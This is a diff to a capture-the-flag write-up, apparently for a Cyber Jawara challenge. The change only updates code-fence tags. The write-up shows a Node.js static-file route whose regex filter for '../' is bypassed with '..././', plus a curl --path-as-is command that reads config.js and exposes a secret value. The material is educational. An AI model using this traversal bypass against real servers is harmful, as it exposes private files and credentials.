@@ -14,8 +14,7 @@ private: false
 
 Given web application that serves static file by defining custom routes and using `fs.readFile` to read the content. 
 
-```
-nodejs
+```javascript
 
 if (req.url.startsWith('/static/')) {
     const urlPath = req.url.replace(/\.\.\//g, '')
@@ -34,8 +33,7 @@ if (req.url.startsWith('/static/')) {
 
 Known that there could be possibility to path traversal there is a protection using `const urlPath = req.url.replace(/\.\.\//g, '')` but this regex is could be bypassed using `..././flag.txt`
 
-```
-bash
+```bash
 
 curl --path-as-is "https://static-web.ctf.cyberjawara.id/static/..././config.js"
 const secret = 'wWij1i23ejasdsdjvno2rnj123123';
